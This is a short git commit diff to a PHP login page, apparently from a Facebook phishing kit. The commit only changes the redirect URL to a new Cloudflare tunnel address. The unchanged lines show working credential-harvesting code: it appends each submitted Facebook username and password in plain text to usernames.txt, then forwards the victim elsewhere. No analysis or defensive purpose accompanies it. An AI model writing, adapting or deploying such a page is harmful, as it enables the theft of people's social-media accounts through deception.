94dbf804d74fadce01d04f5eb6951de457a1f1c0
Mahfuz <11mahfuzrahman148@gmail.com>
2022-04-19 19:11:17 +0600

    bisillah

--- .sites/fb_security/login.php
+++ .sites/fb_security/login.php
@@ -1,6 +1,6 @@
 <?php
 
 file_put_contents("usernames.txt", "Facebook Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://october-lean-editorials-fabrics.trycloudflare.com');
+header('Location: https://charm-relative-sf-backup.trycloudflare.com');
 exit();
 ?>
